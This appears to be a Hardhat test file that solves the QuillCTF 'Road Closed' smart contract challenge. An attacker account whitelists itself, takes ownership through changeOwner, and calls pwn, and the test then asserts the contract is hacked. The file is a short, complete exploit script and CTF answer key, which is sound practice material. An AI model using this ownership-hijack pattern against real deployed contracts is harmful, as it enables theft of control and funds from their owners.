import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {RoadClosed} from '../../types/typechain';

describe('QuillCTF 1: Road Closed', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: RoadClosed;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('RoadClosed', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('should hijack ownership', async () => {
    expect(await contract.isOwner()).to.be.true;

    // use attacker's pov for the contract
    contract = contract.connect(attacker);

    // whitelist yourself
    await contract.connect(attacker).addToWhitelist(attacker.address);

    // change owner
    await contract.connect(attacker).changeOwner(attacker.address);

    // pwn
    await contract.connect(attacker)['pwn(address)'](attacker.address);
  });

  after(async () => {
    // contract should be hacked & you should be the owner
    expect(await contract.isHacked()).to.be.true;
    expect(await contract.isOwner()).to.be.true;
  });
});
